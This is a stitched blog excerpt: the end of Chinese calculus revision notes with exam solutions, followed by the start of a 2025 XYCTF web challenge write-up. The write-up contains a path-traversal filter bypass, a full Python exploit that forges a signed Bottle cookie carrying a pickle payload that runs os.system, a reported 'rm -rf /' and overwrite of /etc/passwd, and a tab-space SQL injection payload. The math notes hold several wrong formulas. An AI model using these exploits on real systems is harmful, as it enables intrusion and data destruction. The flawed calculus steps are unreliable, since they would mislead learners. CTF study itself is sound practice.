f[x(t),y(t)]\\sqrt{[x’(t)]^2+[y’(t)]^2}dt \\\\or \\int_Lf(x,y)ds=\\int_\\alpha^\\beta f[x,y(x)]\\sqrt{[1+[y’(x)]^2}dxdy$$空间曲线类似：$$\\int_Lf(x,y,z)ds=\\int_\\alpha^\\beta f[x(t),y(t),z(t)]\\sqrt{[x’(t)]^2+[y’(t)]^2+[z’(t)]^2}dt \\\\$$ 2. 第二型曲线积分（对坐标的曲线积分）这个看起来就不那么地直观，其物理背景是求变力在曲线上做功，大概想象一下子。计算方法：$$\\int_{\\overset{\\frown}{AB}}P(x,y)dx=\\int_\\alpha^\\beta P[x(t),y(t)]x’(t)dt \\\\\\int_{\\overset{\\frown}{AB}}Q(x,y)dy=\\int_\\alpha^\\beta Q[x(t),y(t)]y’(t)dt$$两类曲线积分关系：$$\\int_LPdx+Qdy=\\int_L(Pcos\\alpha +Qcos\\beta )ds \\\\or \\int_\\Gamma Pdx+Qdy+Rdz=\\int_L(Pcos\\alpha +Qcos\\beta +Rcos\\gamma )ds$$ 3. 格林公式就一道式子：$$∮_L Pdx+Qdy=∬\\limits_D( \\frac{ \\partial Q }{ \\partial x }- \\frac{ \\partial P }{ \\partial y })dxdy\\\\$$条件是函数 $P$ 和 $Q$ 在平面区域 $D$ 上有连续的偏导数 ，这个条件一般不管， 主要是边界曲线 $L$ 闭合就行。格林公式可以将第二类曲线积分化为简单的二重积分，非常地不错。 PS:以下这些符号的 Latex 支持不是很好，直接用字符了。$$∮ \\ ∯ \\ ∰ \\ ∱ \\ ∲ \\ ∳$$ 例（2020-2021第二学期期末，2）计算曲线积分 $∮_L(xy^2-\\sin y)\\mathrm{d}y-(\\cos x+x^2y)\\mathrm{d}x$ ，其中 $L$ 为圆周 $x^2+y^2=4$ ，积分方向为沿 $L$ 逆时针方向。解 $L$ 为闭合曲线，且 $P,Q$ 在 $L$ 围成的 $D$ 上偏导也连续，所以可以用格林公式：$$\\begin{aligned}I&amp;=\\iint\\limits_D[y^2-(-x^2)]\\mathrm{d}x\\mathrm{d}y \\\\&amp;=\\int_0^{2\\pi}\\mathrm{d}\\theta\\int_0^2r^2\\cdot r\\mathrm{d}r \\\\&amp;=8\\pi\\end{aligned}$$ 4. 第一型曲面积分和第一型曲线积分一样直观，就是求一个曲面的面积。计算方法：$$\\iint \\limits_{\\Sigma} f(x,y,z) \\mathrm{d}S=\\iint \\limits_{D_{xy}}f[x,y,z(x,y)]\\sqrt{1+(\\frac{\\partial z}{\\partial x})^2+(\\frac{\\partial z}{\\partial y})^2}\\mathrm{d}x\\mathrm{d}y$$ 5. 第二型曲面积分计算方法：$$\\iint \\limits_{\\Sigma} R(x,y,z) \\mathrm{d}S=\\iint \\limits_{D_{xy}}R[x,y,z(x,y)]\\mathrm{d}x\\mathrm{d}y$$ 两类曲面积分关系：$$\\iint \\limits_\\Sigma P\\mathrm{d}y\\mathrm{d}z+Q\\mathrm{d}x\\mathrm{d}z+R\\mathrm{d}x\\mathrm{d}y=\\iint \\limits_\\Sigma(Pcos\\alpha+Qcos\\beta+Rcos\\gamma)\\mathrm{d}S$$ 6. 高斯公式与斯托克斯公式高斯公式：$$∯ \\limits_\\Sigma P\\mathrm{d}y\\mathrm{d}z+Q\\mathrm{d}x\\mathrm{d}z+R\\mathrm{d}x\\mathrm{d}y=\\iiint \\limits_\\Omega(\\frac{\\partial P}{\\partial x}+\\frac{\\partial Q}{\\partial y}+\\frac{\\partial R}{\\partial z})\\mathrm{d}x\\mathrm{d}y\\mathrm{d}z \\\\or ∯ \\limits_\\Sigma(P\\mathrm{cos}\\alpha+Q\\mathrm{cos}\\beta+R\\mathrm{cos}\\gamma)\\mathrm{d}S=\\iiint \\limits_\\Omega(\\frac{\\partial P}{\\partial x}+\\frac{\\partial Q}{\\partial y}+\\frac{\\partial R}{\\partial z})\\mathrm{d}x\\mathrm{d}y\\mathrm{d}z$$例（2021-2022第二学期期末，3）计算曲面积分 $∯ \\limits_\\Sigma(x-z)\\mathrm{d}y\\mathrm{d}z+z\\mathrm{d}x\\mathrm{d}y$ ，其中 $\\Sigma$ 是由 $z=x^2+2y^2$ 与 $z=1$ 所围成立体表面的外侧。解 $\\Sigma$ 是封闭曲面，直接上高斯公式，有$$I=\\iiint \\limits_\\Omega(1+1)\\mathrm{d}x\\mathrm{d}y\\mathrm{d}z=2\\iiint \\limits_\\Omega\\mathrm{d}V$$作柱面坐标变换 $x=r\\cos\\theta,y=\\frac{r\\sin\\theta}{\\sqrt2}$ ，得$$I=\\int_0^{2\\pi}\\mathrm{d}\\theta\\int_0^1\\mathrm{d}r\\int_0^1\\frac{r}{\\sqrt{2}}dz=\\frac{\\pi}{\\sqrt2}$$ 直角坐标与柱面坐标关系：$$\\left\\{\\begin{aligned}x&amp;=r\\cos\\theta \\\\y&amp;=r\\sin\\theta \\\\z&amp;=z\\end{aligned}\\right.$$此时 $\\mathrm{d}V=r\\mathrm{d}r\\mathrm{d}\\theta\\mathrm{d}z$直角坐标与球面坐标关系：$$\\left\\{\\begin{aligned}x&amp;=r\\sin\\varphi\\cos\\theta \\\\y&amp;=r\\sin\\varphi\\sin\\theta \\\\z&amp;=r\\cos\\varphi\\end{aligned}\\right.$$此时 $\\mathrm{d}V=r^2\\sin\\varphi\\mathrm{d}r\\mathrm{d}\\theta\\mathrm{d}\\varphi$ 斯托克斯公式：$$∮_L P\\mathrm{d}x+Q\\mathrm{d}y+R\\mathrm{d}z=\\iint \\limits_\\Sigma\\begin{vmatrix}\\mathrm{d}y\\mathrm{d}z &amp; \\mathrm{d}x\\mathrm{d}z &amp; \\mathrm{d}x\\mathrm{d}y \\\\\\frac{\\partial}{\\partial x} &amp; \\frac{\\partial}{\\partial y} &amp; \\frac{\\partial}{\\partial z} \\\\P &amp; Q &amp; R\\end{vmatrix}=\\iint \\limits_\\Sigma\\begin{vmatrix}\\mathrm{cos}\\alpha &amp; \\mathrm{cos}\\beta &amp; \\mathrm{cos}\\gamma \\\\\\frac{\\partial}{\\partial x} &amp; \\frac{\\partial}{\\partial y} &amp; \\frac{\\partial}{\\partial z} \\\\P &amp; Q &amp; R\\end{vmatrix}\\mathrm{d}S$$ 第九章 常微分方程1. 基本概念所谓常微分方程，就是区别于偏微分方程，未知函数是一元函数，而不是多元。常微分方程的阶数即肉眼可见的导数的最高阶，如 $y’’’+2(y’’)^3+y^2+x^5$ 就是三阶常微分方程。通解的概念：$n$ 阶常微分方程有解 $y=\\varphi(x;C_1,\\cdots,C_n)$ ，其中 $C_1,\\cdots,C_n$ 是 $n$ 个独立的任意常数，则称其为方程的一个通解；相对的，就有特解的概念，即方程的任何一个不包含任意常数的解。用数学语言表达独立性，有雅可比行列式不为零，即$$\\frac{D(\\varphi,\\varphi’,\\cdots,\\varphi^{n-1})}{D(C_1,C_2,\\cdots,C_n)}\\ne0$$ 举个例子，经典方程 $y’’+y=0$ 有解 $y=C_1\\mathrm{sin}x+C_2\\mathrm{cos}x$ ，则雅可比行列式为$$\\frac{D(y,y’)}{D(C_1,C_2)}=\\begin{vmatrix}\\mathrm{sin}x &amp; \\mathrm{cos}x \\\\\\mathrm{cos}x &amp; -\\mathrm{sin}x\\end{vmatrix}=-1 \\ne 0$$可能你会问这个雅可比行列式具体怎么出來的，其实第一行就是 $y$ 分别对 $C_1$ 和 $C_2$ 求导，第二行是 $y’$ 对 $C_1$ 和 $C_2$ 求导。故 $C_1,C_2$ 是两个独立的任意常数，进而 $y=C_1\\mathrm{sin}x+C_2\\mathrm{cos}x$ 是方程的通解。 2. 初等积分法2.1 变量分离的方程2.2 可化为变量分离的几类方程2.3 一阶线性微分方程形如$$\\frac{\\mathrm{d}y}{\\mathrm{d}x}+P(x)y=Q(x)$$的一阶微分方程就叫一阶线性微分方程。一般套公式就行，若 $Q(x)\\equiv0$ ，则为齐次方程，直接积分有通解 $y=C\\mathrm{e}^{-\\int P(x)\\mathrm{d}x}$ ；若为非齐次方程则用常数变易法求得通解$$y=\\mathrm{e}^{-\\int P(x)\\mathrm{d}x}\\left[\\int Q(x)\\mathrm{e}^{\\int P(x)\\mathrm{d}x}dx+C\\right]$$然后还有贝努里方程（当然贝努利方程也是它，音译嘛）长这样：$$\\frac{\\mathrm{d}y}{\\mathrm{d}x}+P(x)y=Q(x)y^n\\ (n\\ne0,1)$$作变量代换 $z=y^{1-n}$ ，可化为一阶线性方程$$\\frac{\\mathrm{d}z}{\\mathrm{d}x}+(1-n)P(x)z=(1-n)Q(x)$$ 2.4 全微分方程与积分因子例（2021-2022第二学期期末，4）求微分方程 $x\\mathrm{d}y+(y+x^2)\\mathrm{d}x=0$ 的通解。解 $\\frac{\\partial P}{\\partial y}=1=\\frac{\\partial Q}{\\partial x}$，且它们在全平面上连续，故方程为全微分方程。下求原函数 $u(x,y)$ ，由 $\\frac{\\partial u}{\\partial x}=P(x,y)=y+x^2$ ，对 $x$ 积分得$$u(x,y)=xy+\\frac{x^3}{3}+\\varphi(y)$$上式对 $y$ 求偏导得$$\\frac{\\partial u}{\\partial y}=x+\\varphi’(y)$$另一方面，$$\\frac{\\partial u}{\\partial y}=Q(x,y)=x$$比较上两式得 $\\varphi’(y)=0$ ，因而 $\\varphi(y)=0$（这里省略积分常数，不影响后面的通积分表达式），故原函数为 $u(x,y)=xy+\\frac{x^3}{3}$ ，故方程的通解为$$xy+\\frac{x^3}{3}=C$$其中 $C$ 为任意常数。 微分方程的通解也叫通积分 2.5 可降阶的二阶微分方程例（2021-2022第二学期期末，5）求微分方程 $y’’=y’\\cdot y$ 的通解。解 方程中不显含变量 $x$ ，令 $p=y’$ ，并将 $y$ 看作自变量，有 $y’’=p\\frac{\\mathrm{d}p}{\\mathrm{d}y}$ ，代入有$$p\\frac{\\mathrm{d}p}{\\mathrm{d}y}=p\\cdot y$$若 $p=y’=0$ ，则通解为 $y=C$ ，若 $p\\ne0$ ，则有$$\\begin{aligned}\\frac{\\mathrm{d}p}{\\mathrm{d}y}&amp;=y \\\\\\int\\mathrm{d}p&amp;=\\int y\\mathrm{d}y \\\\p&amp;=\\frac{1}{2}y^2+C_1\\end{aligned}$$即 $\\frac{\\mathrm{d}y}{\\mathrm{d}x}=\\frac{1}{2}y^2+C_1$ ，再次分离分量，有$$\\begin{aligned}\\frac{\\mathrm{d}y}{\\mathrm{d}x}&amp;=\\frac{1}{2}y^2+C_1 \\\\\\int\\frac{2}{y^2}\\mathrm{d}y&amp;=\\int\\mathrm{d}x + C_2 \\\\-\\frac{2}{y}&amp;=x+C_3 \\\\y&amp;=-\\frac{2}{x}+C\\end{aligned}$$ 这里面的常量 $C$ 变得我也很迷糊，但是结果代进去是对的，就先这样吧（） 例（2020-2021第二学期期末，5）求微分方程 $\\frac{\\mathrm{d}^2y}{\\mathrm{d}x^2}=(\\frac{\\mathrm{d}y}{\\mathrm{d}x})^3+\\frac{\\mathrm{d}y}{\\mathrm{d}x}$ 的通解。解 令 $p=y’$ ，有 $y’’=p\\frac{\\mathrm{d}p}{\\mathrm{d}y}$ ，代入有$$p\\frac{\\mathrm{d}p}{\\mathrm{d}y}=(p^3+p) \\\\\\frac{1}{p^2+p}\\mathrm{d}p=\\mathrm{d}y \\\\\\arctan p=y+C_1$$即有 $\\frac{\\mathrm{d}y}{\\mathrm{d}x}=p=\\tan(y+C_1)$ ，再次分离分量，有$$\\frac{\\mathrm{d}y}{\\tan(y+C_1)}=\\mathrm{d}x \\\\\\ln\\sin(y+C_1)=x+C_2$$最终得出 $y=\\arcsin e^{x+C_2}-C_1$ 3. 微分方程解的存在唯一性定理4. 高阶线性微分方程5. 二阶线性常系数微分方程 特征根 通解形式 两相异实根 $\\lambda_1,\\lambda_2$ $C_1e^{\\lambda_1x}+C_2e^{\\lambda_2x}$ 二重根 $\\lambda_1$ $(C_1+C_2x)e^{\\lambda_1x}$ 共轭复根 $\\lambda_{1,2}=\\alpha\\pm\\mathrm{i}\\beta$ $e^{\\alpha x}(C_1\\cos\\beta x+C_2\\sin\\beta x)$ $f(x)$ 的形式 条件 特解的形式 $P_n(x)$ “0”不是/是单/是重特征根 $Q_n(x)/xQ_n(x)/x^2Q_n(x)$ $ae^{\\alpha x}$ $\\alpha$ 不是/是单/是重特征根 $Ae^{\\alpha x}/Axe^{\\alpha x}/Ax^2e^{\\alpha x}$ $a\\cos\\beta x+b\\sin\\beta x$ $\\pm\\mathrm{i}\\beta$ 不是/是特征根 $A\\cos\\beta x+B\\sin\\beta x/x(A\\cos\\beta x+B\\sin\\beta x)$ $P_n(x)e^{\\alpha x}$ $\\alpha$ 不是/是单/是重特征根 $Q_n(x)e^{\\alpha x}/xQ_n(x)e^{\\alpha x}/x^2Q_n(x)e^{\\alpha x}$ $P_n(x)e^{\\alpha x}(a\\cos\\beta x+b\\sin\\beta x)$ $\\alpha\\pm\\mathrm{i}\\beta$ 不是/是特征根 $e^{\\alpha x}[Q_n(x)\\cos\\beta x+R_n(x)\\sin\\beta x]/xe^{\\alpha x}[Q_n(x)\\cos\\beta x+R_n(x)\\sin\\beta x]$ 咋一看很多，其实挺有规律，比如多一个根就多乘一个 $x$ ，原来的系数变成待定的。 例（2021-2022第二学期期末，6）求微分方程 $y’’+y=e^{3x}(x+2)$ 的通解。解 先求对应齐次微分方程 $y’’+y=0$ 的通解，特征方程 $\\lambda^2+1=0$ 的特征根 $\\lambda_{1,2}=\\pm \\mathrm{i}$ ，故通解形式为$$y(x)=e^{ax}(C_1\\cos\\beta x+C_2\\sin\\beta x)=C_1\\cos x+C_2\\cos x$$其中 $C_1,C_2$ 为任意常数再用待定系数法求特解，“3“不是特征根，故设方程有特解 $y=(Ax+B)e^{3x}$ ，则$$\\begin{aligned}y’&amp;=Ae^{3x}+3(Ax+B)e^{3x} \\\\y’’&amp;=3Ae^{3x}+3Ae^{3x}+9(Ax+B)e^{3x}=(9Ax+6A+9B)e^{3x} \\\\\\end{aligned}$$回代得$$y’’+y=(10Ax+6A+10B)e^{3x}=e^{3x}(x+2)$$解得 $A=\\frac{1}{10},\\ B=\\frac{7}{50}$ ，故特解为 $y=(\\frac{1}{10}x+\\frac{7}{50})e^{3x}$ ，与齐次方程通解相加，得出所求非齐次方程通解为$$y(x)=C_1\\cos x+C_2\\cos x+(\\frac{1}{10}x+\\frac{7}{50})e^{3x}$$其中 $C_1,C_2$ 为任意常数。 例（2020-2021第二学期期末，6）求微分方程 $\\frac{\\mathrm{d}^2y}{\\mathrm{d}x^2}+y=e^x+\\cos x$ 的通解。解 特征方程 $\\lambda^2+1=0$ 的特征根 $\\lambda_{1,2}=\\pm \\mathrm{i}$ ，故齐次方程通解形式为$$y(x)=e^{ax}(C_1\\cos\\beta x+C_2\\sin\\beta x)=C_1\\cos x+C_2\\cos x$$这个方程的非齐次项由两项组成，就先分别求两项的特解，再相加，就是原方程的特解。对方程 $y’’+y=e^x$ 不难求得特解 $y=\\frac{1}{2}e^x$ ，方程 $y’’+y=\\cos x$ 的特解 $y=\\frac{1}{2}x\\cos x$ ，故原方程的特解为$$y=\\frac{1}{2}(e^x+x\\cos x)$$与齐次方程通解相加，得出所求非齐次方程通解为$$y(x)=C_1\\cos x+C_2\\cos x+\\frac{1}{2}(e^x+x\\cos x)$$ 6. 用常数变易法求解二阶线性非齐次方程与欧拉方程的解法7. 常系数线性微分方程组第十章 无穷级数1. 柯西收敛原理与数项级数的概念2. 正项级数的收敛判别法 比较审敛法比收敛小的就收敛，比发散大的就发散 比值审敛法$\\lim\\limits_{n\\to\\infty}\\frac{u_{n+1}}{u_n}$ 小于 1 就收敛，大于 1 就发散，等于 1 时敛散性不定 根值审敛法与上面类似，$\\lim\\limits_{n\\to\\infty}\\sqrt[n]{u_n}$ 小于 1 就收敛，大于 1 就发散，等于 1 时敛散性不定 对数审敛法 例（2021-2022第二学期期末，10-1）判断数项级数 $\\sum\\limits_{n=1}^{\\infty}3^n\\sin(\\frac{\\pi}{4^n})$ 的敛散性。解 放缩一下再比较判别法$$\\sum_{n=1}^{\\infty}3^n\\sin(\\frac{\\pi}{4^n})&lt;\\sum_{n=1}^{\\infty}3^n(\\frac{\\pi}{4^n})=\\pi\\sum_{n=1}^{\\infty}(\\frac{3}{4})^n$$由于 $\\sum_{n=1}^{\\infty}(\\frac{3}{4})^n$ 收敛，故原级数收敛。 3. 任意项级数莱布尼茨判别法 若交错级数满足下列条件：$$(1)u_n\\geqslant u_{n+1}; \\\\(2)\\lim_{n\\rightarrow\\infty}=0,$$则级数收敛。狄利克雷判别法 考虑级数$$\\sum_{k=1}^{\\infty}a_kb_k$$若序列 ${a_k}$ 单调且 $\\lim\\limits_{k\\rightarrow\\infty}a_k=0$ ，又级数 $\\sum\\limits_{n=1}^{\\infty}b_k$ 的部分和序列有界，则级数 $\\sum\\limits_{k=1}^{\\infty}a_kb_k$ 收敛。例（2021-2022第二学期期末，10-2）判断数项级数 $\\sum\\limits_{n=2}^{\\infty}\\frac{\\cos(2n)}{\\ln n}$ 的敛散性。解 取 $a_k=\\frac{1}{\\ln n}$ ，易证得 $a_k$ 单调且 $\\lim\\limits_{k\\rightarrow\\infty}a_k=0$ ，下证级数 $\\sum\\limits_{n=2}^{\\infty}\\cos(2n)$ 的部分和序列有界：$$\\begin{aligned}\\left|\\sum_{k=2}^{n}\\cos(2k)\\right|&amp;=\\left|\\cos4+\\cos6+\\cdots+\\cos2n\\right| \\\\&amp;=\\frac{1}{\\sin1}\\left|\\cos4\\sin1+\\cos6\\sin1+\\cdots+\\cos2n\\sin1\\right| \\\\&amp;=\\frac{1}{\\sin1}\\left|\\frac{\\sin5-\\sin3}{2}+\\frac{\\sin7-\\sin5}{2}+\\cdots+\\frac{\\sin(2n+1)-\\sin(2n-1)}{2}\\right| \\\\&amp;=\\frac{1}{\\sin1}\\left|\\frac{\\sin(2n+1)-\\sin3}{2}\\right| \\\\&amp;\\leqslant\\frac{1}{\\sin1}\\end{aligned}$$故级数 $\\sum\\limits_{n=2}^{\\infty}\\frac{\\cos(2n)}{\\ln n}$ 收敛。 积化和差公式$${\\displaystyle \\sin \\alpha \\cos \\beta ={\\sin(\\alpha +\\beta )+\\sin(\\alpha -\\beta ) \\over 2}} \\\\{\\displaystyle \\cos \\alpha \\sin \\beta ={\\sin(\\alpha +\\beta )-\\sin(\\alpha -\\beta ) \\over 2}} \\\\{\\displaystyle \\cos \\alpha \\cos \\beta ={\\cos(\\alpha +\\beta )+\\cos(\\alpha -\\beta ) \\over 2}} \\\\{\\displaystyle \\sin \\alpha \\sin \\beta ={\\cos(\\alpha +\\beta )-\\cos(\\alpha -\\beta ) \\over -2}}$$ 阿贝尔判别法（1）无穷数列 ${a_k}$ 单调有界（2）级数 $\\sum\\limits_{k=1}^\\infty b_k$ 收敛则级数 $\\sum\\limits_{k=1}^\\infty a_kb_k$ 收敛。 4. 函数项级数4.1 函数序列及函数项级数的一致收敛性4.2 函数项级数一致收敛的必要条件与判别法强级数判别法 若函数项级数 $\\sum\\limits_{n=1}^\\infty u_n(x)$ 的一般项满足：$$|u_n(x)|\\leqslant a_n,\\quad \\forall x\\in X,n=1,2,\\cdots,$$且正项级数 $\\sum\\limits_{n=1}^\\infty a_n$ 收敛，则该函数项级数在 $X$ 上一致收敛。 狄利克雷判别法 与数项级数的狄利克雷判别法类似。（1）在 $X$ 中任意取定一个 $x$ ，数列 ${a_n(x)}$ 对 $n$ 单调，且函数序列 ${a_n(x)}$ 在 $X$ 上一致收敛于 $0$（2）函数项级数 $\\sum\\limits_{n=1}^\\infty b_n(x)$ 的部分和序列 ${B_n(x)}$ 在 $X$ 上一致有界则 $\\sum\\limits_{n=1}^\\infty a_n(x)b_n(x)$ 在 $X$ 上一致收敛。 阿贝尔判别法 与数项级数的阿贝尔判别法类似。（1）在 $X$ 中任意取定一个 $x$ ，数列 ${a_n(x)}$ 单调，又函数序列 ${a_n(x)}$ 在 $X$ 上一致有界（2）级数 $\\sum\\limits_{n=1}^\\infty b_n(x)$ 在 $X$ 上一致收敛则级数 $\\sum\\limits_{n=1}^\\infty a_n(x)b_n(x)$ 在 $X$ 上一致收敛。 4.3 一致收敛级数的性质和函数的连续性 设函数项级数 $\\sum\\limits_{n=1}^\\infty u_n(x)$ 在 $[a,b]$ 上一致收敛，且其每一项 $u_n(x)$ 在 $[a,b]$ 上都连续，则其和函数 $S(x)=\\sum\\limits_{n=1}^\\infty u_n(x)$ 在 $[a,b]$ 上也连续。 例（2021-2022第二学期期末，11）考虑函数项级数 $\\sum\\limits_{n=2}^{\\infty}\\frac{1}{n^2\\sqrt x}$ ，证明：（1）级数在 $(0,1)$ 上收敛（2）级数在 $(0,1)$ 上不一致收敛（3）级数的和函数 $S(x)$ 在 $(0,1)$ 上连续解 （1）就是数项级数，随便证。（2）存在点列 $x_n=\\frac{1}{n^4}\\in(0,1)(n=1,2,\\cdots)$ 使 $u_n(x_n)=1$ 5. 幂级数幂级数是函数项级数的一种，长这样：$$a_0+a_1(x-x_0)+a_2(x-x_0)^2+\\cdots+a_n(x-x_0)^n+\\cdots$$ 5.1 幂级数的收敛半径$$\\lim_{n\\rightarrow\\infty}\\left|\\frac{a_{n+1}}{a_{n}}\\right|=l$$那么级数 $\\sum\\limits^n_{n=0}a_nx^n$ 的收敛半径 $R=1/l$ ，当然直接反着除直接出也行。收敛区间就是 $(-R,R)$ ，收敛域就根据端点的收敛情况再修正下区间闭不闭合。 例（2021-2022第二学期期末，8）求幂级数 $\\sum\\limits^\\infty_{n=0}\\frac{1}{n+1}x^n$ 的收敛半径与和函数。解$$\\lim_{n\\rightarrow\\infty}\\left|\\frac{a_n}{a_{n+1}}\\right|=\\lim_{n\\rightarrow\\infty}\\left|\\frac{n}{n+1}\\right|=1$$故收敛半径 $R=1$ ，收敛区间 $(-1,1)$ 。然后讨论两个端点，当 $x=1$ 时，原级数发散；当 $x=-1$ 时，原级数收敛，故收敛域为 $[-1,1)$设和函数 $S(x)=\\sum\\limits^\\infty_{n=0}\\frac{1}{n+1}x^n$ ，则两边乘 $x$ 有 $xS(x)=\\sum\\limits^\\infty_{n=0}\\frac{1}{n+1}x^{n+1}$ ，两边求导有$$\\left[xS(x)\\right]’=\\sum\\limits^\\infty_{n=0}x^n=\\frac{1}{1-x}$$再两边求积，有$$xS(x)=\\int^x_0\\frac{1}{1-x}\\mathrm{d}x=-\\ln(1-x),\\ x\\in[-1,1)$$故当 $x\\ne0$ 时，$S(x)=-\\frac{1}{x}\\ln(1-x)$ ；当 $x=0$ 时，肉眼可见 $S(x)=1$ 。 这里有个小 trick ，就是幂级数里认定 $0^0=1$ ，至于为什么是这样，网上众说纷纭，读者可自行查阅。 5.2 幂级数的性质和函数项级数一样，可以逐项求积，也可以逐项求导。 6. 泰勒级数求函数在 $x=k$ 处的泰勒展开式就作 $t=x-k$ 变换，然后求出来的式子再代回去就行了。 记一下常用的几条泰勒展开式：$$\\frac{1}{1-x}=1+x+x^2+x^3+\\cdots+x^n+\\cdots,\\ x\\in(-1,1)\\\\e^x=1+x+\\frac{x^2}{2!}+\\frac{x^3}{3!}+\\cdots+\\frac{x^n}{n!}+\\cdots\\\\\\sin x=x-\\frac{x^3}{3!}+\\frac{x^5}{5!}-\\frac{x^7}{7!}+\\cdots+(-1)^{n-1}\\frac{x^{2n-1}}{(2n-1)!}+\\cdots\\\\\\cos x=1-\\frac{x^2}{2!}+\\frac{x^4}{4!}-\\frac{x^6}{6!}+\\cdots+(-1)^{n}\\frac{x^{2n}}{(2n)!}+\\cdots\\\\\\arctan x=x-\\frac{x^3}{3}+\\frac{x^5}{5}-\\frac{x^7}{7}+\\cdots+(-1)^{n}\\frac{x^{2n+1}}{(2n+1)}+\\cdots\\\\\\ln(1+x)=x-\\frac{x^2}{2}+\\frac{x^3}{3}-\\frac{x^4}{4}+\\cdots+(-1)^{n-1}\\frac{x^n}{n}+\\cdots\\\\(1+x)^\\alpha=1+\\alpha x+\\frac{\\alpha(\\alpha-1)}{2!}x^2+\\frac{\\alpha(\\alpha-1)(\\alpha-2)}{3!}x^3+\\cdots+\\frac{\\alpha(\\alpha-1)(\\alpha-2)\\cdots(\\alpha-n+1)}{n!}x^n+R_n(x)$$关于最后这个 $R_n(x)$ ，一堆证明后得出，当 $x\\in (-1,1)$ 时有 $\\lim\\limits_{n\\rightarrow \\infty}=0$ 例（2021-2022第二学期期末，10）求函数 $y=\\frac{x}{4+x^2}$ 在 $x=0$ 处的泰勒级数，并指出其收敛域。解 $y=\\frac{x}{4}\\cdot\\frac{1}{1+(\\frac{x}{2})^2}$，右边显然就是 $\\arctan x$ 导数的形式了，故我们由 $\\arctan x$ 的泰勒展开式逐项求导有$$\\frac{1}{1+x^2}=(\\arctan x)’=1-x^2+x^4-x^6+\\cdots+(-1)^{n}x^{2n}+\\cdots$$变形得$$\\frac{1}{1+(\\frac{x}{2})^2}=1-\\frac{x^2}{4}+\\frac{x^4}{16}-\\frac{x^6}{64}+\\cdots+(-1)^{n}\\frac{x^{2n}}{2^{2n}}+\\cdots$$最后代入 $y=\\frac{x}{4}\\cdot\\frac{1}{1+(\\frac{x}{2})^2}$，有$$y=\\frac{x}{4}-\\frac{x^3}{16}+\\frac{x^5}{64}-\\frac{x^7}{256}+\\cdots+(-1)^n\\frac{x^{2n+1}}{2^{2n+2}}+\\cdots$$那么级数形式为$$y=\\sum\\limits^\\infty_{n=0}\\frac{(-1)^n}{4^{n+1}}x^{2n+1}$$收敛半径 $R=\\lim\\limits_{n\\rightarrow\\infty}\\left|\\frac{(-1)^{n}}{4^{n+1}}\\cdot\\frac{4^{n+2}}{(-1)^{n+1}}\\right|=4$故收敛区间为 $(-4,4)$ ，当 $x=-4$ 时，","link":"/2022/08/07/%E9%AB%98%E6%95%B0%E4%B8%8B%E7%AC%94%E8%AE%B0/"},{"title":"2025 XYCTF","text":"又来学 Web 了 碎碎念没憋住，还是看了下密码。唉 WebSignin白盒，给了个 main.py，直接看代码： 12345678910111213141516171819202122232425262728293031323334353637383940# -*- encoding: utf-8 -*-'''@File : main.py@Time : 2025/03/28 22:20:49@Author : LamentXU ''''''flag in /flag_{uuid4}'''from bottle import Bottle, request, response, redirect, static_file, run, routewith open('../../secret.txt', 'r') as f: secret = f.read()app = Bottle()@route('/')def index(): return '''HI'''@route('/download')def download(): name = request.query.filename if '../../' in name or name.startswith('/') or name.startswith('../') or '\\\\' in name: response.status = 403 return 'Forbidden' with open(name, 'rb') as f: data = f.read() return data@route('/secret')def secret_page(): try: session = request.get_cookie(&quot;name&quot;, secret=secret) if not session or session[&quot;name&quot;] == &quot;guest&quot;: session = {&quot;name&quot;: &quot;guest&quot;} response.set_cookie(&quot;name&quot;, session, secret=secret) return 'Forbidden!' if session[&quot;name&quot;] == &quot;admin&quot;: return 'The secret has been deleted!' except: return &quot;Error!&quot;run(host='0.0.0.0', port=8080, debug=False) 应该是先用文件读拿到 secret.txt，过滤很简单，既然不允许 ../../，那直接 ./.././../ bypass 即可。 构造 ?filename=./.././../secret.txt 拿到 secret 为 'Hell0_H@cker_Y0u_A3r_Sm@r7'。 观察了下 bottle 的源码，这个 secret 是用来签名的，只有验签通过他才会执行 pickle.loads()。 1234567891011121314151617def get_cookie(self, key, default=None, secret=None, digestmod=hashlib.sha256): &quot;&quot;&quot; Return the content of a cookie. To read a `Signed Cookie`, the `secret` must match the one used to create the cookie (see :meth:`BaseResponse.set_cookie`). If anything goes wrong (missing cookie or wrong signature), return a default value. &quot;&quot;&quot; value = self.cookies.get(key) if secret: # See BaseResponse.set_cookie for details on signed cookies. if value and value.startswith('!') and '?' in value: sig, msg = map(tob, value[1:].split('?', 1)) hash = hmac.new(tob(secret), msg, digestmod=digestmod).digest() if _lscmp(sig, base64.b64encode(hash)): dst = pickle.loads(base64.b64decode(msg)) if dst and dst[0] == key: return dst[1] return default return value or default 搜索得知 pickle 存在反序列化漏洞，最终代码如下： 12345678910111213141516171819202122232425262728293031323334import base64, hmac, os, hashlibimport pickleunicode = strdef tob(s, enc='utf8'): if isinstance(s, unicode): return s.encode(enc) return b'' if s is None else bytes(s)secret = 'Hell0_H@cker_Y0u_A3r_Sm@r7'def cookie_encode(value, secret=None, digestmod=hashlib.sha256): &quot;&quot;&quot; Return a signed cookie. To read the cookie, the same `secret` must be used (see :meth:`BaseResponse.get_cookie`). &quot;&quot;&quot; if secret: # See BaseResponse.set_cookie for details on signed cookies. msg = base64.b64encode(value) hash = hmac.new(tob(secret), msg, digestmod=digestmod).digest() return '!%s?%s' % (base64.b64encode(hash).decode(), msg.decode()) return valueclass exp(): def __reduce__(self): cmd = &quot;ls -al /&quot; return (os.system, (cmd,)) import pickletoolspayload = pickle.dumps(exp())payload = pickletools.optimize(payload)payload = cookie_encode(payload, secret=secret)print(payload) 实现 RCE，试了半天怎么都弹不出 shell，都开始怀疑我命令到底有没有执行了，搞了个 rm -rf /，再读 secret.txt，发现文件没了，说明命令确实有执行，同时发现 /etc/passwd 也有权限删，直接把 flag 读到 /etc/passwd 里了hhh 后来执行一下 ls /bin 才发现根本没有 curl，要弹 shell 的话估计得换个方法。 /bin/ 内容如下 1arch ash base64 bbconfig busybox cat chattr chgrp chmod chown cp date dd df dmesg dnsdomainname dumpkmap echo egrep false fatattr fdflush fgrep fsync getopt grep gunzip gzip hostname ionice iostat ipcalc kbd_mode kill link linux32 linux64 ln login ls lsattr lzop makemime mkdir mknod mktemp more mount mountpoint mpstat mv netstat nice pidof ping ping6 pipe_progress printenv ps pwd reformime rev rm rmdir run-parts sed setpriv setserial sh sleep stat stty su sync tar touch true umount uname usleep watch zcat ezsql(手动滑稽)随便试几下发现 username 字段可以注入，password 输什么都会被转义，且存在空格过滤，参考这篇文章使用 tab 作为空格绕过，payload 如下： 1username='%09OR%091=1%09#&amp;password=1 